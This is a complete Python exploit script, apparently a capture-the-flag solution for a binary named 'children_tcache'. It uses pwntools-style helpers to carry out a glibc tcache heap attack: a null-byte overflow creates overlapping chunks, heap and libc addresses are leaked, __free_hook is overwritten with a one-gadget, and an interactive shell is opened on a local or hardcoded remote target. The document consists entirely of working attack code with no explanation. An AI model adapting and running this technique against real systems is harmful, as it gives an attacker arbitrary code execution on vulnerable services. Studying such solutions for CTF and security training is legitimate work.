#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './children_tcache'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'54.178.132.125', 'port':8763})
'''
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.19.so_remote')
'''
env.select()

#==========

binf = ELF(bin_file)

#libc = ELF(env.libc) if env.libc else binf.libc
libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

offset_libc_onegadget   = 0x4f322

#==========

def attack(conn):
    ct = ChildrenTcache(conn)

    ct.new(0x410, 'aaaa')   # 0
    ct.new(0x18,  'bbbb')   # 1
    ct.new(0x18,  'cccc')   # 2
    ct.new(0x4f8, 'dddd')   # 3

    for i in range(0x18, 0x12, -1):
        ct.delete(2)
        ct.new(i,  'c'*i)               # 2
    ct.delete(2)
    ct.new(0x18,  'c'*0x10+p64(0x460))  # 2

    ct.delete(0)
    ct.delete(3)

    ct.new(0x410, 'AAAA')   # 0
    ct.new(0x410, 'BBBB')   # 3
    ct.new(0x18,  'CCCC')   # 4
    ct.new(0x410, 'DDDD')   # 5
    ct.new(0x18,  'EEEE')   # 6

    ct.delete(5)
    ct.delete(3)
    addr_heap_base = u(ct.show(1)) - 0xab0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    ct.new(0x410, 'DDDD')   # 3
    addr_libc_mainarena = u(ct.show(1)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    #addr_libc_system    = libc.sep_function['system']
    addr_libc_onegadget = libc.address + offset_libc_onegadget
    
    ct.new(0x18,  'bbbb')   # 5
    ct.delete(1)
    ct.delete(5)

    ct.new(0x8,  p64(addr_libc_free_hook))  # 1
    ct.new(0x8,  p64(0xdeadbeef))           # 5
    ct.new(0x8,  p64(addr_libc_onegadget))  # 7

    ct.delete(0)

class ChildrenTcache:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, size, data):
        self.sendlineafter('choice: ', '1')
        self.sendlineafter('Size:', str(size))
        self.sendlineafter('Data:', data)

    def show(self, index):
        self.sendlineafter('choice: ', '2')
        self.sendlineafter('Index:', str(index))
        return self.recvuntil('\n$$$$', drop=True)

    def delete(self, index):
        self.sendlineafter('choice: ', '3')
        self.sendlineafter('Index:', str(index))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
